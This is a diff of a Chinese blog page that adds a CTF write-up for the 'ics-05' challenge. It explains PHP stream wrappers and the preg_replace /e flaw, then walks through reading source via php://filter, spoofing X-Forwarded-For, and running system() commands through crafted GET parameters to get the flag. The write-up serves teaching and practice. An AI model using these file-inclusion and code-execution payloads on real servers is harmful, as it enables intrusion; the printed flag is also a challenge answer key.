@@ -468,14 +468,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    823
+                    2.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    9 分
                 </div>
                 
                 
@@ -530,6 +530,176 @@ rtt min/avg/max/mdev = 0.064/0.064/0.064/0.000 ms</code></pre><p>输入百度的
 <li>php通过@访问文件，Djonga报错返回文件内容</li>
 <li>url编码越界可能会引起报错</li>
 </ul>
+<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p>
+<h3 id="预备知识-1"><a href="#预备知识-1" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">Web安全实战系列：文件包含漏洞</a></p>
+<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><blockquote>
+<p>file://     — 访问本地文件系统</p>
+<p>http://     — 访问 HTTP(s) 网址</p>
+<p>ftp://     — 访问 FTP(s) URLs</p>
+<p>php://     — 访问各个输入/输出流（I/O streams）</p>
+<p>zlib://     — 压缩流</p>
+<p>data://     — 数据（RFC 2397）</p>
+<p>glob://     — 查找匹配的文件路径模式</p>
+<p>phar://     — PHP 归档</p>
+<p>ssh2://     — Secure Shell 2</p>
+<p>rar://     —RAR</p>
+<p>ogg://      — 音频流</p>
+<p>expect://     — 处理交互式的流</p>
+</blockquote>
+<ul>
+<li><p>PHP.ini</p>
+<p>在php.ini利用两个重要参数allow_url_fopen和allow_url_include</p>
+<p>allow_url_fopen： 默认值为ON， 允许url里封装协议访问文件</p>
+<p>allow_url_include：默认值为OFF，不允许包含url里的封装协议包含文件</p>
+</li>
+<li><p>php://filter</p>
+<p>经常使用的伪协议，一般用于任意文件的读取，有时也可以用于getshell。在双OFF的情况下也可以使用。</p>
+<p>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、fiel_get_contents()，在数据流读取之前没有机会使用其他过滤器。</p>
+<p><strong>php://filter参数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">resource=&lt;要过滤的数据流&gt;</td>
+<td align="left">这个参数是必须的，它指定了你要筛选过滤的数据流</td>
+</tr>
+<tr>
+<td align="left">read=&lt;独链的筛选列表&gt;</td>
+<td align="left">可选参数，可以设定一个或多个过滤器名称，以管道符`</td>
+</tr>
+<tr>
+<td align="left">write=&lt;写链的筛选列表&gt;</td>
+<td align="left">可选参数，可以设定一个或多个过滤器名称，以管道符`</td>
+</tr>
+<tr>
+<td align="left">&lt;;两个链的筛选列表&gt;</td>
+<td align="left">任何没有以read= 或 read= 做前缀的筛选器列表会视情况应用于读或写链</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>php://filter/[read/write]=string.[rot13/strip_tags/…]/resource=xxx</p>
+</blockquote>
+<p>filter和string过滤器连用可以对字符串进行过滤。filter的read和write参数有不同的应用场景。read用于include()和file_get_contents(), write用于file_put_contents()中。</p>
+<blockquote>
+<p>php://filter/convert.base64-[encode/decode]/resource=xxx</p>
+</blockquote>
+<p>这是使用的过滤器是convert.base64-encode。它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码后经过base64编码后的数据。</p>
+</li>
+<li><p>php://input</p>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设置为php://input, 同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p>需要开启allow_url_include</p>
+<p>注：当enctype=”multipart/form-data”时php://input是无效的</p>
+</li>
+<li><p>file://</p>
+<p>file://伪协议在双OFF的时候也可用，用于本地文件包含</p>
+<p>注：file://伪协议必须是绝对路径</p>
+</li>
+<li><p>phar://</p>
+<p>PHP归档，常常跟文件包含，文件上传结合考察。通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
+<blockquote>
+<p>phar://test.[zip/jpg/png….]/file.txt</p>
+</blockquote>
+<p>  其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://test.test/file.txt也可以运行。</p>
+</li>
+<li><p>zip://,bzip2://,zlib://</p>
+<p>在双OFF的时候也可以用</p>
+<blockquote>
+<p>zip://test.zip%23file.txt</p>
+</blockquote>
+<p>  和phar://一样用于读取压缩文件，不过对于“zip://test.zip#file.txt”中的“#”要编码为”%23“。因为url的#后的内容不会别传送</p>
+</li>
+<li><p>data://text/plain;base64,base编码字符串</p>
+<p>很常用的数据流构造器，将读取后面base64编码字符串后解码的数据作为数据流的传入</p>
+</li>
+</ul>
+<h4 id="preg-replace命令执行漏洞"><a href="#preg-replace命令执行漏洞" class="headerlink" title="preg_replace命令执行漏洞"></a>preg_replace命令执行漏洞</h4><ul>
+<li><p>函数功能：执行一个正则表达式的搜索和替换</p>
+</li>
+<li><p>定义：</p>
+<blockquote>
+<p> mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</p>
+</blockquote>
+<p>搜索subject中匹配pattern的部分，如果匹配成功以replacement进行替换</p>
+</li>
+<li><p>漏洞：</p>
+<ul>
+<li>$pattern 存在/e模式修正符，允许代码执行</li>
+<li>/e 修正符是<strong>preg_replace</strong>将$replacement当作php代码命令来执行</li>
+<li>执行的另一个条件是匹配成功</li>
+</ul>
+</li>
+<li><p>利用举例</p>
+<p>​    <code>preg_replace(&quot;/123/e&quot;, &quot;system(&quot;ls&quot;)&quot;, &quot;123&quot;)</code></p>
+</li>
+<li><p>构造的向服务器发送请求的url中的特殊字符要使用其相应的url编码。</p>
+</li>
+</ul>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><ul>
+<li><p>访问地址得到一个页面，根据题目发现了一个设备维护中心的页面，点击进去</p>
+<p><img src="https://ae01.alicdn.com/kf/Hf82099b111734726814e29437a874828b.jpg" alt></p>
+<p>什么也没有，再点击云平台设备维护中心</p>
+<p><img src="https://ae01.alicdn.com/kf/H5f6c690546b14a008ac9d91fa15b6cc25.jpg" alt></p>
+<p>发现了get一个请求page=index，感觉像是文件包含漏洞</p>
+<p><strong>LFI漏洞的黑盒判断方法：</strong><br><strong>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞</strong></p>
+</li>
+<li><p>尝试输入<code>../</code>查看文件夹内容无果</p>
+</li>
+<li><p>尝试获取index.php源码，利用php伪协议</p>
+<blockquote>
+<p>?page=php://filter/read=convert.base64-encode/resource=index.php</p>
+</blockquote>
+<p>如果过滤器不设置为进行base64编码，则相当于进行网页请求，会持续执行index.php的代码返回页面。访问构造的url的到一段base64编码</p>
+</li>
+<li><p>base64转码得到index.php中的内容，下面为其中的一段</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">echo</span> <span class="token string">"&lt;br >Welcome My Admin ! &lt;br >"</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pat<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$replacement</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>rep<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>sub<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$replacement</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现其中使用了preg_replace函数，而且对get到的变量没有进行过滤，那么我们便可以利用其命令执行模式<code>/e</code></p>
+</li>
+<li><p>我们首先要构造header的x-forwarded-for为本地地址<code>127.0.0.1</code>才可以执行 if 中的内容。</p>
+<p>使用burp project可以修改header</p>
+</li>
+<li><p>构造get 变量使其能够执行preg_replace函数的命令模式</p>
+<pre><code>?pat=/123/e&amp;rep=system(&quot;find+-name+flag*&quot;)&amp;sub=123</code></pre><p>“+”在url中会被解释为空格，当然也能够使用<code>%20</code>。</p>
+</li>
+<li><p>补充url，访问，使用burpproject进行修改x-forwarded-for</p>
+<p><img src="https://ae01.alicdn.com/kf/Hc908dc053cd54110a26aa7feb388300cZ.jpg" alt></p>
+<p>得到返回的文件地址</p>
+<p><img src="https://ae01.alicdn.com/kf/H375a7946d2b542a9af3b254c69ae0a47u.jpg" alt></p>
+</li>
+<li><p>再次构造get的变量</p>
+<pre><code>?pat=/123/e&amp;rep=system(&quot;cat+./s3chahahaDir/flag/flag.php&quot;)&amp;sub=123</code></pre><p>和上一步一样的访问步骤，修改x-forwarded-for, 最后查看网页源代码也可以查看burp project的http历史记录里面的响应</p>
+<p><img src="https://ae01.alicdn.com/kf/He8e3b9ff04a54f20b997ffe152212d9bE.jpg" alt></p>
+</li>
+<li><p>答案：<code>cyberpeace{4b8c09620a7c82c9927c7c95f3f07d3d}</code></p>
+</li>
+</ul>
+<blockquote>
+<p>感谢</p>
+<ul>
+<li><a href="https://www.cnblogs.com/gaonuoqi/p/11386346.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaonuoqi/p/11386346.html</a></li>
+<li><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></li>
+<li><a href="https://www.cnblogs.com/dubhe-/p/9997842.html" target="_blank" rel="noopener">https://www.cnblogs.com/dubhe-/p/9997842.html</a></li>
+</ul>
+</blockquote>
 
             </div>
             <hr />
@@ -1017,7 +1187,7 @@ rtt min/avg/max/mdev = 0.064/0.064/0.064/0.000 ms</code></pre><p>输入百度的
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">39.4k</span>
+            <span class="white-color">41k</span>
             
 
             <br>
